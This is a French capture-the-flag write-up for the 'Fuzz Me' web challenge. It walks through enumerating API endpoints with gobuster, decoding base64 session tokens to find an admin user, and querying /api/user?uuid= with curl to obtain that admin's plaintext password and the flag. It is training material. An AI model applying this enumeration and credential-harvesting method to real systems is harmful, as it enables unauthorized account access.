# Fuzz Me - 128 points

challenge web de fuzzing.

en inspectant la page, on trouve un endpoint `/api/login`. On a donc une api à explorer.
avec gobuster, on trouve `/api/sessions` et `/api/user`. 

- `/api/sessions`: 
```json
	
{"sessions":	
0	"eyJ1c2VyIjogIjY1YTlmYzRjLWIwNDYtNDE3OS1iMDE5LTdlMDcxZDFjZTc5ZiIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIitBSEc5NUZKeHRzNGoxNFJuTHdxaEE9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfmI0ifQ=="
1	"eyJ1c2VyIjogIjkwNjhjY2ZmLTBkOTgtNGViNS1iMjdkLTQyZDcwZTQyYmRkZCIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIkkvS3M1clg0SGJSb2hhbm9pc1lUOXc9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfpoQifQ=="
2	"eyJ1c2VyIjogImIwZWU5YjNjLTdkNjMtNDQwZi05ZDcyLWM3NTg2ODZiMDVlNCIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIjYwY3k4bUJrM3luOFNhRisvSGVhUHc9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfkp0ifQ=="
3	"eyJ1c2VyIjogIjEzYTE0NTExLTc3NzktNDJmNS04MjliLTc1OTc3MzRjODc0YyIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIjRVQWljczZ3TzkvVzM3Qjd2Q0NQT3c9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfmYsifQ=="
4	"eyJ1c2VyIjogIjg3MmUwYTQxLTk5ZTUtNGU3Ni1hNWU3LTk2MDkzNzU3ZmE4MSIsICJpc0FkbWluIiA6IHRydWUsICJ3ZWlyZF9zdHVmZiIgOiAiU1NCaGJTQjBhR1VnWVdSdGFXNGdJUT09IiwgImhhcHB5X3NtaWxleSIgOiAi8J+RqOKAjfCfjbMifQ=="
5	"eyJ1c2VyIjogIjk2OGYyZTlkLTI3YzEtNDUwMy05NzM5LTNiMWM4NjMwNjU2NCIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIllOK1pWNWxTMkZTNjlaMmhmd1RaT3c9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfjIgifQ=="
6	"eyJ1c2VyIjogIjViNTgwMDcyLTM2YzAtNDU0Yi04NThiLTVmZmJjOTRiNjgyNSIsICJpc0FkbWluIiA6IGZhbHNlLCAid2VpcmRfc3R1ZmYiIDogIkZkNWlPVU9qMDJrZmU0aDMyOGplNHc9PSIsICJoYXBweV9zbWlsZXkiIDogIvCfkoMifQ=="}
```
Encodé en base64, en décodant, on obtient:
```
b'{"user": "65a9fc4c-b046-4179-b019-7e071d1ce79f", "isAdmin" : false, "weird_stuff" : "+AHG95FJxts4j14RnLwqhA==", "happy_smiley" : "\xf0\x9f\x98\x8d"}'
b'{"user": "9068ccff-0d98-4eb5-b27d-42d70e42bddd", "isAdmin" : false, "weird_stuff" : "I/Ks5rX4HbRohanoisYT9w==", "happy_smiley" : "\xf0\x9f\xa6\x84"}'
b'{"user": "b0ee9b3c-7d63-440f-9d72-c758686b05e4", "isAdmin" : false, "weird_stuff" : "60cy8mBk3yn8SaF+/HeaPw==", "happy_smiley" : "\xf0\x9f\x92\x9d"}'
b'{"user": "13a14511-7779-42f5-829b-7597734c874c", "isAdmin" : false, "weird_stuff" : "4UAics6wO9/W37B7vCCPOw==", "happy_smiley" : "\xf0\x9f\x99\x8b"}'
b'{"user": "872e0a41-99e5-4e76-a5e7-96093757fa81", "isAdmin" : true, "weird_stuff" : "SSBhbSB0aGUgYWRtaW4gIQ==", "happy_smiley" : "\xf0\x9f\x91\xa8\xe2\x80\x8d\xf0\x9f\x8d\xb3"}'
b'{"user": "968f2e9d-27c1-4503-9739-3b1c86306564", "isAdmin" : false, "weird_stuff" : "YN+ZV5lS2FS69Z2hfwTZOw==", "happy_smiley" : "\xf0\x9f\x8c\x88"}'
b'{"user": "5b580072-36c0-454b-858b-5ffbc94b6825", "isAdmin" : false, "weird_stuff" : "Fd5iOUOj02kfe4h328je4w==", "happy_smiley" : "\xf0\x9f\x92\x83"}'
```
On a un utilisateur qui est admin. On va tenter de l'exploiter.
- `/api/user`:
```Json
{"error":	"Paramètre manquant !"}
```
Comme les utilisateurs sont stockés sous forme d'UUID, on peut tester le paramètre `?uuid`.
`curl "http://fuzz-me.phack.fr/api/user?uuid=872e0a41-99e5-4e76-a5e7-96093757fa81"`

```Json
{"info": {"name" : "Biden", "firstname" : "Joe", "login" : "admin", "password" : "NeOIsTh3T4rget<3", "description":"Président, tout simplement."}}
```
En se connectant avec le login/password, on obtient finalement le flag.